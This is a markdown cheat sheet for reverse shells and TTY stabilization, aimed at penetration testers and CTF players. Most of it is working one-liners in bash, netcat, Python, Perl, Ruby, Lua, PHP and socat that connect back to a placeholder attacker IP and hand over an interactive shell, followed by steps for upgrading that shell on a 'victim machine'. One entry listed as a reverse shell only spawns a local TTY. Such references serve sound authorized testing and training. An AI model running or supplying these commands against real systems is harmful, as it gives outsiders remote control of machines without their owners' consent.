# Reverse Shell & TTY Stabilization Cheat Sheet

> A comprehensive cheat sheet for spawning TTY shells and stabilizing reverse shells during penetration testing and CTF challenges.

---

## Table of Contents

- [What is TTY?](#what-is-tty)
- [Why Stabilize Your Shell?](#why-stabilize-your-shell)
- [Basic Reverse Shells](#basic-reverse-shells)
  - [Bash](#bash)
  - [Netcat](#netcat)
  - [Python](#python)
  - [Script](#script)
  - [Perl](#perl)
  - [Ruby](#ruby)
  - [Lua](#lua)
- [TTY Shell Spawning](#tty-shell-spawning)
- [Full TTY Stabilization Process](#full-tty-stabilization-process)
- [Alternative Methods](#alternative-methods)
- [Tips & Troubleshooting](#tips--troubleshooting)

---

## What is TTY?

**TTY** (Teletypewriter) is a terminal interface that allows interactive communication with the operating system. When you get a basic reverse shell, you often have a non-interactive shell without TTY features like:

- Command history (arrow keys)
- Tab completion
- Clear screen (`Ctrl + L`)
- Text editors (vim, nano)
- Job control (`Ctrl + C`, `Ctrl + Z`)

Stabilizing your shell gives you a fully interactive TTY session.

---

## Why Stabilize Your Shell?

| Problem | After Stabilization |
|---------|---------------------|
| `Ctrl + C` kills the shell | `Ctrl + C` interrupts current command |
| No command history | Up/down arrow keys work |
| No tab completion | Tab completion works |
| Programs prompt hangs | Interactive programs (sudo, ssh) work |
| Cannot use text editors | vim, nano work properly |
| Terminal resize issues | Terminal adapts to your window size |

---

## Basic Reverse Shells

### Bash

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

### Netcat

**Traditional Netcat (with -e):**
```bash
nc -e /bin/bash <ATTACKER_IP> <PORT>
nc -e /bin/sh <ATTACKER_IP> <PORT>
```

**Netcat OpenBSD (without -e):**
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> <PORT> > /tmp/f
```

### Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

**Python3:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

### Script

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Perl

```bash
perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

**Perl (alternative - local spawn only):**
```bash
perl -e 'exec "/bin/sh";'
```

### Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("<ATTACKER_IP>",<PORT>).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

**Ruby (alternative - local spawn only):**
```bash
ruby -e 'exec "/bin/sh"'
```

### Lua

```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('<ATTACKER_IP>','<PORT>');os.execute('/bin/bash -i <&3 >&3 2>&3');"
```

**Lua (alternative - local spawn only):**
```bash
lua -e 'os.execute("/bin/sh")'
```

### PHP

```bash
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/bash -i <&3 >&3 2>&3");'
```

---

## TTY Shell Spawning

If you already have a limited shell, spawn a TTY using these methods:

| Method | Command |
|--------|---------|
| **Python** | `python -c 'import pty; pty.spawn("/bin/bash")'` |
| **Python3** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| **Script** | `/usr/bin/script -qc /bin/bash /dev/null` |
| **Perl** | `perl -e 'exec "/bin/sh";'` |
| **Ruby** | `ruby -e 'exec "/bin/sh"'` |
| **Lua** | `lua -e 'os.execute("/bin/sh")'` |
| **Echo** | `echo os.system('/bin/bash')` |
| **Direct** | `/bin/sh -i` |

> **Note:** Replace `/bin/bash` with `/bin/sh` if bash is not available.

---

## Full TTY Stabilization Process

This is the **recommended method** to get a fully interactive TTY shell:

### Step 1: Spawn a TTY on the Victim Machine

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Or if Python is not available:

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

### Step 2: Background the Shell

Press **`Ctrl + Z`** to background the shell.

### Step 3: Configure Your Local Terminal (Attacker Machine)

```bash
stty raw -echo
fg
```

Then press **`Enter`** twice.

### Step 4: Configure the Victim Shell

```bash
export TERM=xterm
stty cols 132 rows 34
```

### Summary (Quick Steps)

```text
[Victim Machine]
$ python -c 'import pty; pty.spawn("/bin/bash")'
[Press Ctrl + Z]

[Attacker Machine]
$ stty raw -echo
$ fg
[Press Enter x2]

[Victim Machine]
$ export TERM=xterm
$ stty cols 132 rows 34
```

---

## Alternative Methods

### Method 1: Using `socat`

**Attacker (listener):**
```bash
socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
```

**Victim (connect back):**
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER_IP>:<PORT>
```

### Method 2: Using `script` with `--return`

```bash
script -qc /bin/bash /dev/null
```

### Method 3: Using `expect`

```bash
/usr/bin/expect -c 'spawn /bin/bash; interact'
```

---

## Tips & Troubleshooting

### Finding Terminal Size

Before stabilizing, get your terminal size:

```bash
stty size
```

Output example: `34 132` (rows columns)

Then set it on the victim:

```bash
stty rows 34 cols 132
```

### Fixing Arrow Keys

If arrow keys show `^[[A` etc., your TERM variable is likely wrong:

```bash
export TERM=xterm-256color
```

### Common TERM Values

| Value | Description |
|-------|-------------|
| `xterm` | Basic xterm |
| `xterm-256color` | xterm with 256 colors |
| `screen` | GNU Screen |
| `tmux` | tmux terminal |

### Resetting Your Local Terminal

If things go wrong and your local terminal gets messed up:

```bash
reset
```

Or:

```bash
stty sane
```

### Background Job Issues

If you accidentally background the process with `Ctrl + Z` and `fg` doesn't work:

```bash
jobs
%1
```

### What if Python is Not Available?

Check for these alternatives:

```bash
which python python3 perl ruby lua php expect script
```

Use whatever is available for TTY spawning.

### Avoiding Common Mistakes

- ❌ Don't press `Ctrl + C` in an unstabilized shell — it will kill the connection
- ✅ Always spawn a TTY before running interactive programs
- ✅ Set `TERM` variable to enable colors and proper rendering
- ✅ Set terminal size to prevent display glitches

---

## Quick Reference Card

```text
┌─────────────────────────────────────────────────────────────┐
│                    REVERSE SHELL QUICK REF                   │
├─────────────────────────────────────────────────────────────┤
│ 1. Start listener:   nc -lvnp <PORT>                        │
│ 2. Get reverse shell using methods above                    │
│ 3. Spawn TTY:        python -c 'import pty;pty.spawn("")'   │
│ 4. Background:       Ctrl + Z                               │
│ 5. Set raw mode:     stty raw -echo; fg                     │
│ 6. Set TERM:         export TERM=xterm                      │
│ 7. Set size:         stty cols <X> rows <Y>                 │
└─────────────────────────────────────────────────────────────┘
```

---

## Disclaimer

This cheat sheet is intended for **authorized penetration testing**, **CTF competitions**, and **educational purposes** only. Always ensure you have explicit permission before testing systems you do not own.

---

## Resources

- [PayloadsAllTheThings - Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Upgrade Your Shell - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-tty)
- [pentestmonkey - Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
